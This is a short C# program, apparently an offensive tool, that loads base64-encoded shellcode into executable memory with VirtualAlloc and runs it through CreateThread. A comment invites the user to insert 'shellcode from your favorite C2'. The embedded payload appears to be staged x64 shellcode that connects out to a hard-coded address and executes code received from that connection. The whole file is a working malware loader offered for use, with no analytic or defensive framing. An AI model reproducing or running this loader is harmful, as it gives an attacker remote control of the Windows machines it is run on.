using System;
class Program
{
    [System.Runtime.InteropServices.DllImport("kernel32")]
    private static extern IntPtr VirtualAlloc(IntPtr lpStartAddr, UIntPtr size, Int32 flAllocationType, IntPtr flProtect);

    [System.Runtime.InteropServices.DllImport("kernel32")]
    private static extern IntPtr CreateThread(IntPtr lpThreadAttributes, UIntPtr dwStackSize, IntPtr lpStartAddress, IntPtr param, Int32 dwCreationFlags, ref IntPtr lpThreadId);
    
    [System.Runtime.InteropServices.DllImport("kernel32")]
    private static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);

    static void Main(string[] args)
    {
        // Replace with 64-bit base64 encoded shellcode from your favorite C2. Recommend setting exitfunc to thread.
        string x = "/EiD5PDozAAAAEFRQVBSUUgx0mVIi1JgVkiLUhhIi1IgSA+3SkpNMclIi3JQSDHArDxhfAIsIEHByQ1BAcHi7VJIi1Igi0I8QVFIAdBmgXgYCwIPhXIAAACLgIgAAABIhcB0Z0gB0ESLQCBQSQHQi0gY41ZI/8lBizSITTHJSAHWSDHArEHByQ1BAcE44HXxTANMJAhFOdF12FhEi0AkSQHQZkGLDEhEi0AcSQHQQYsEiEgB0EFYQVheWVpBWEFZQVpIg+wgQVL/4FhBWVpIixLpS////11JvndzMl8zMgAAQVZJieZIgeygAQAASYnlSbwCAATSwKgAvUFUSYnkTInxQbpMdyYH/9VMiepoAQEAAFlBuimAawD/1WoKQV5QUE0xyU0xwEj/wEiJwkj/wEiJwUG66g/f4P/VSInHahBBWEyJ4kiJ+UG6maV0Yf/VhcB0DEn/znXlaPC1olb/1UiD7BBIieJNMclqBEFYSIn5QboC2chf/9VIg8QgXon2akBBWWgAEAAAQVhIifJIMclBulikU+X/1UiJw0mJx00xyUmJ8EiJ2kiJ+UG6AtnIX//VSAHDSCnGSIX2deFB/+c=";

        Console.WriteLine("Starting...");
        Eb(x);
        Console.WriteLine("Finished!");
    }
    public static void Eb(string x)
    {
        var bytes = Convert.FromBase64String(x);
        var mem = VirtualAlloc(IntPtr.Zero, (UIntPtr)bytes.Length, 0x1000, (IntPtr)0x40);
        System.Runtime.InteropServices.Marshal.Copy(bytes, 0, mem, bytes.Length);
        var threadId = IntPtr.Zero;
        IntPtr hThread = CreateThread(IntPtr.Zero, UIntPtr.Zero, mem, IntPtr.Zero, 0, ref threadId);
        WaitForSingleObject(hThread, 0xFFFFFFFF);
    }
}
